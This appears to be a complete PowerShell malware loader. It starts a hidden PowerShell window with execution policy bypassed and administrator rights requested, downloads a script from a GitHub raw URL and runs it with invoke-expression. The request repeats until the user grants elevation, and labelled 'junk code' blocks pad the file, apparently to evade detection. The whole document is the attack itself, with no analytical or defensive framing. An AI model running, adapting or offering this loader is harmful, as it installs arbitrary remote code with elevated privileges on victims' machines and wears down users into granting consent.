$cmd = 'Start-Process'
$exe = 'powershell'
$style = 'Hidden'
$args = '-NoProfile -ExecutionPolicy Bypass -Command $pl = iwr https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/e.ps1; invoke-expression $pl'
$verb = 'RunAs'
$success = $false

# Junk code start
$randomVar1 = 42
$randomVar2 = "Some random text"
$junkCode1 = $randomVar1 * 3 + 10
$junkCode2 = $randomVar2.ToUpper()
$junkCode3 = [math]::Sqrt($randomVar1)
$junkCode4 = "A" * $randomVar1
$junkCode5 = $randomVar2.Substring(0, 4)
# Junk code end

do {
    try {
        # Attempt to run PowerShell as admin
        &$cmd $exe -WindowStyle $style -ArgumentList $args -Verb $verb
        $success = $true

        # More junk code
        $tempVar = $randomVar1 + $junkCode1
        $tempString = "Temporary string " + $junkCode2
        $someResult = [datetime]::Now
    } catch {
        # If the command was not successful, set success to false
        $success = $false
    }
} until ($success)

exit
